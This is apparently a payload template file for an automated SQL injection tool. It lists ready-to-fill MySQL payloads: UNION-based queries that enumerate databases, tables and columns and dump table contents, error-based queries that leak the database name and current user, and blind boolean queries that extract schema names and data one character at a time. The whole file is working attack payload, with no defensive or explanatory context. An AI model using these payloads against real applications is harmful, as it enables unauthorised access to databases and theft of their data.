union.databases: +' UNION SELECT {offset_bef} CONCAT({delimiter}, schema_name, {delimiter}) {offset_aft} FROM information_schema.schemata LIMIT {limit} OFFSET {offset}-- -
union.tables: +' UNION SELECT {offset_bef} CONCAT({delimiter}, table_name, {delimiter}) {offset_aft} FROM information_schema.tables WHERE table_schema='{database}' LIMIT {limit} OFFSET {offset}-- -
union.columns: +' UNION SELECT {offset_bef} CONCAT({delimiter}, column_name, {delimiter}) {offset_aft} FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {limit} OFFSET {offset}-- -
union.dump: +' UNION SELECT {offset_bef} CONCAT({delimiter}, {column}, {delimiter}) {offset_aft} FROM {database}.{table} LIMIT {limit} OFFSET {offset}-- -

error_based.database: ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT DATABASE()), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +

error_based.user: ' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT({delimiter}, (SELECT USER()), {delimiter}, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)-- +

blind.databases: ' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, schema_name, {delimiter}) FROM information_schema.schemata LIMIT 1 OFFSET {offset}),{position},1)='{char}',1,0)-- -

blind.dump: ' OR IF(SUBSTRING((SELECT CONCAT({delimiter}, {column}, {delimiter}) FROM {database}.{table} LIMIT 1 OFFSET {row_offset}),{position},1)='{char}',1,0)-- -
